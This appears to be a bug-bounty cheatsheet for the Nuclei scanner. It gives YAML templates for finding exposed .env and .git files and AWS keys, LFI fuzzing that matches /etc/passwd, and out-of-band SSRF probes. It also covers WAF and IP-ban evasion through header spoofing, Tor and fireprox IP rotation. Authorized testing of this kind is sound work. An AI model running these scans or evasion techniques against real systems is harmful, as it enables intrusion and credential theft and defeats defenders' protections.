---
title: "Nuclei Arsenal (Custom Templates + Anti-Block Evasion)"
type: cheatsheet
tags: [cheatsheet, nuclei, custom-templates, evasion, waf-bypass, fuzzing]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
---

# Nuclei Arsenal

Write custom scanners, fuzz, and run without getting WAF/rate-limit-blocked. Tool basics: [[nuclei]]. Keep program-specific templates in `targets/<eng>/`.

## Custom template structure
```yaml
id: my-check
info:
  name: Example exposed file
  author: you
  severity: high
  tags: exposure,custom
http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.git/config"
    matchers-condition: and
    matchers:
      - type: word
        words: ["DB_PASSWORD", "[core]"]
        condition: or
      - type: status
        status: [200]
    extractors:
      - type: regex
        regex: ["AKIA[0-9A-Z]{16}"]
```

## Ready custom templates
**LFI fuzz (DAST, fuzzes every param):**
```yaml
id: lfi-fuzz
info: {name: LFI fuzz, severity: high, tags: lfi,fuzz}
http:
  - pre-condition:
      - type: dsl
        dsl: ["method == 'GET'"]
    payloads:
      lfi: helpers/wordlists/lfi.txt        # your wordlist (see [[wordlists]])
    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz: ["{{lfi}}"]
    matchers:
      - type: regex
        regex: ["root:.*:0:0:", "\\[boot loader\\]"]
```
**Blind / OOB (interactsh) for SSRF/RCE:**
```yaml
http:
  - raw:
      - |
        GET /?url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http","dns"]
```
**CVE template from the arsenal** (path + version matcher) - model after `nuclei-templates/http/cves/`. See [[cve-arsenal]].

## Fuzzing mode (find your own bugs, not just known CVEs)
```bash
nuclei -l live.txt -dast                      # run all fuzzing templates
nuclei -l urls.txt -t fuzzing/ -fuzz-param-frequency 10
# import Burp/proxy traffic and fuzz real requests:
nuclei -dast -im burp -input-file traffic.xml
```

## Anti-block / evasion (run without bans)
```bash
# rate + concurrency (the main control)
nuclei -l t.txt -rl 10 -rld 60 -c 10 -bulk-size 10      # 10 req/60s, low concurrency
nuclei -l t.txt -mhe 30                                  # tolerate host errors (raise so it does not auto-skip)
nuclei -l t.txt -timeout 10 -retries 2

# header / fingerprint randomization
nuclei -l t.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0)" -H "X-Forwarded-For: 127.0.0.1"
# rotate UA per request via a wrapper / -v and custom templates with {{rand}}

# proxy + IP rotation (defeat IP bans / WAF rep)
nuclei -l t.txt -p http://127.0.0.1:8080                 # through Burp
nuclei -l t.txt -p socks5://127.0.0.1:9050               # Tor
# IP rotation: front each request through AWS API Gateway with fireprox -> new source IP per request
fireprox --command create --url https://target ; nuclei -l fireprox_urls.txt

# scope to high-signal, low-noise (less likely to trip WAF)
nuclei -l t.txt -severity critical,high -tags cve,kev,exposure -exclude-tags intrusive,dos,fuzz
nuclei -l t.txt -ss host-spray            # spread requests across hosts, not hammer one
nuclei -disable-update-check -silent -nc   # quiet automation

# WAF payload evasion: encode in the template (urlencode/double-url, case, comments) - nuclei renders {{url_encode(...)}}
```

## Self-hosted OOB (avoid blocked oast.fun)
```bash
interactsh-server -domain yourdomain.com -...     # run your own
nuclei -l t.txt -iserver https://oob.yourdomain.com -itoken <tok>
```

## Workflow
`subfinder -> httpx -> nuclei` (recon pipeline). Tune `-rl`/`-c`/`-mhe` to the target's tolerance; `-ss host-spray` + fireprox for large scopes. Respect RoE (`no_dos`/`passive_only` -> do not run nuclei active templates). See [[recon-dorks]], [[cve-arsenal]], [[wordlists]].
